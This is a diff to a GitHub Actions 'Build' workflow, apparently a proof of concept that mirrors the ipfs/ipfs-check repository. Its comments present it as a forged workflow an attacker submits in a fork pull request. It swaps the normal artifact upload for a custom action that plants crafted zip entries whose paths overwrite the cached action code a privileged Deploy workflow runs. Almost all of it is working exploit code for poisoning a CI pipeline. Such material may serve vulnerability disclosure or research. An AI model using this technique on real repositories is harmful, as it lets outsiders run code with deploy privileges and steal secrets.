@@ -1,3 +1,7 @@
+# Mirror of ipfs/ipfs-check .github/workflows/build.yml, with the PR-supplied
+# build steps replaced by the "forged Build workflow" an attacker can submit in
+# a fork PR (same workflow name: Build). Uploads the artifact name the
+# privileged Deploy workflow expects, with crafted zip entries.
 name: Build
 
 permissions:
@@ -18,9 +22,13 @@ jobs:
       - name: Checkout code
         uses: actions/checkout@v5
 
+      - name: Install artifact client used only to craft entry names
+        working-directory: .github/actions/plant
+        run: npm install @actions/artifact@2.3.2 --no-save --silent
+
       - name: Upload build artifact
-        uses: actions/upload-artifact@v7
+        uses: ./.github/actions/plant
         with:
           name: website-build-${{ github.run_id }}
-          path: ${{ env.BUILD_PATH }}
-          retention-days: 1
+          pairs: "payload/action.yml->/home/runner/work/_actions/ipshipyard/ipfs-deploy-action/v1/action.yml,payload/github-script-index.js->/home/runner/work/_actions/actions/github-script/v8/dist/index.js"
+          extract-root: ${{ github.workspace }}/website-build
